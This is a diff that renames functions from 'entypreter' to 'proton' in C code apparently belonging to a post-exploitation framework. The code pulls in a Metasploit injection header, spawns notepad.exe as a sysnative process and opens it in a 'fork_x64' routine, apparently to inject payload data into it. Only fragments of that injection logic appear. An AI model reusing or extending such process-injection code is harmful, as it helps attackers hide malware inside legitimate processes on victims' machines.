@@ -1,8 +1,8 @@
-#include "entypreter_process.h"
+#include "proton_process.h"
 #include "metasploit/metasploit_inject.h"
 #include <stdio.h>
 
-BOOL entypreter_create_sysnative_process(LPCSTR program, LPDWORD dwPID)
+BOOL proton_create_sysnative_process(LPCSTR program, LPDWORD dwPID)
 {
 	STARTUPINFO si = { 0 };
 	PROCESS_INFORMATION pi = { 0 };
@@ -24,7 +24,7 @@ BOOL entypreter_create_sysnative_process(LPCSTR program, LPDWORD dwPID)
 	return TRUE;
 }
 
-BOOL entypreter_fork_x64(entypreter_shim_parsed *parsed, LPWSTR lpParam, char *data, DWORD dwDataSize)
+BOOL proton_fork_x64(proton_shim_parsed *parsed, LPWSTR lpParam, char *data, DWORD dwDataSize)
 {
 	BOOL ret = FALSE;
 	DWORD dwPID = 0;
@@ -38,7 +38,7 @@ BOOL entypreter_fork_x64(entypreter_shim_parsed *parsed, LPWSTR lpParam, char *d
 
 	do
 	{
-		if (!entypreter_create_sysnative_process("notepad.exe", &dwPID))
+		if (!proton_create_sysnative_process("notepad.exe", &dwPID))
 			break;
 
 		hProcess = OpenProcess(dwAccess, FALSE, dwPID);
